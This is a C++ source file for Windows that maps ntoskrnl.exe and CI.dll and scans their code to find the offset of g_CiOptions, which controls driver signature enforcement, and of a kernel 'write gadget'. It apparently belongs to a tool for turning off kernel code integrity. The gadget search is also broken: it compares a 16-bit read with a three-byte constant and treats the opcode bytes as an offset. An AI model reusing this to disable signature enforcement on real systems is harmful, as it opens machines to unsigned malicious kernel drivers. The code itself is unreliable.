#include "global.h"
#include "hde/hde64.h"

void FindWriteGadget(_In_ PVOID MappedBase)
{
	const PUCHAR FsRtlInitializeFileLock = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "FsRtlInitializeFileLock"));

	if (FsRtlInitializeFileLock == nullptr)
		return;

	// Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);

	LONG Rel = 0;
	hde64s hs;
	ULONG c = 0;
	ULONG j = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(FsRtlInitializeFileLock + c) == 0x118948) // MOV qword ptr [RCX],RDX - 48 89 11
		{
			Rel = *reinterpret_cast<PLONG>(FsRtlInitializeFileLock + c);
			break;
		}
		hde64_disasm(FsRtlInitializeFileLock + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	const PUCHAR mov = FsRtlInitializeFileLock + Rel + 2;

	// Printf(L"ntBase:                  %p\n", MappedBase);
	Printf(L"> Offset asm mov:   %p\n", (mov - MappedBase));
}

// For Windows 8 and worse
void QueryCiOptions(
	_In_ PVOID MappedBase
)
{
	ULONG c;
	LONG Rel = 0;
	hde64s hs;

	const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
	// Printf(L"CiInitialize:    %p\n", CiInitialize);

	if (CiInitialize == nullptr)
		return;

	c = 0;
	ULONG j = 0;
	do
	{
		// call CipInitialize
		if (CiInitialize[c] == 0xE8)
			j++;

		if (j > 2)
		{
			Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
			break;
		}

		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	const PUCHAR CipInitialize = CiInitialize + c + 5 + Rel;

	// Printf(L"CipInitialize:   %p\n", CipInitialize);
	c = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(CipInitialize + c) == 0x0d89)
		{
			Rel = *reinterpret_cast<PLONG>(CipInitialize + c + 2);
			break;
		}
		hde64_disasm(CipInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	const PUCHAR MappedCiOptions = CipInitialize + c + 6 + Rel;

	// Printf(L"CiBase:          %p\n", MappedBase);
	// Printf(L"MappedCiOptions: %p\n", MappedCiOptions);
	Printf(L"> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));
}

void GetWriteGadget()
{
	WCHAR Path[MAX_PATH];
	const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return;
	}
	FindWriteGadget(MappedBase);

Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return;
}

static
NTSTATUS
AnalyzeCi()
{
	// Map file as SEC_IMAGE
	WCHAR Path[MAX_PATH];
	const CHAR CiDll[] = "CI.dll";

	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs",
		SharedUserData->NtSystemRoot,
		CiDll);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return Status;
	}

	// // Find CI.dll!g_CiOptions
	// ULONG_PTR CiDllBase;
	// Status = FindKernelModule(CiDll, &CiDllBase);
	// if (!NT_SUCCESS(Status))
	// 	goto Exit;

	// ULONG_PTR gCiOptionsAddress;
	QueryCiOptions(MappedBase); //, CiDllBase, &gCiOptionsAddress);

Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return Status;
}

void CIInfo() {
	Printf(L"\n");
	AnalyzeCi();
	Printf(L"\n");
	GetWriteGadget();
}
